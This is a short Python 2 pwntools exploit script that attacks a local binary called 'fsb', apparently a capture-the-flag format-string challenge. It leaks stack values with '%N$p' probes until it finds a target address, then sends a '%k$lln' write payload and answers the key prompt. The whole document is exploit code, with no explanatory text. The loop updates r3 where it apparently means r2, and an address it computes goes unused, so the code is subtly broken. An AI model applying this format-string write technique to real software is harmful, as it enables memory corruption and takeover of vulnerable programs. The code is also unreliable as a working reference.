from pwn import *
import struct
import time


r1=1
r2=r1+10
k=1
substr='804a060'

while True:
    p=process('fsb')

    p.recvline() #get  string 1
    send1=" "
    p.sendline(send1)
    val1=p.recvline() #entered value 1

    p.recvline() #get string 2
    send2=" "
    p.sendline(send2)
    val2=p.recvline() #entered value 2

    p.recvline() #get string 3
    send3=".".join(["%%%d$p" % i for i in range(r1,r2)])
    print "range:",r1,r2
    p.sendline(send3)
    val3=p.recvline() #entered value 3
    print val3
    if substr in val3:
        k=input("Enter offset:")
        p.recvline() #get string 4
        addr=p32(0x0804a060)
        win=('A'*85)+'%'+str(k)+'$lln'
        p.sendline(win)
        rval=p.recvline() #recv value value 4 : print buf
        print p.recvline()
        print "Key??",p.recvline() #Key
        time.sleep(3)
        p.sendline('85')
        print p.recvline() #Correct
        break

    r1=(r1+10)%250
    r3=r1+10

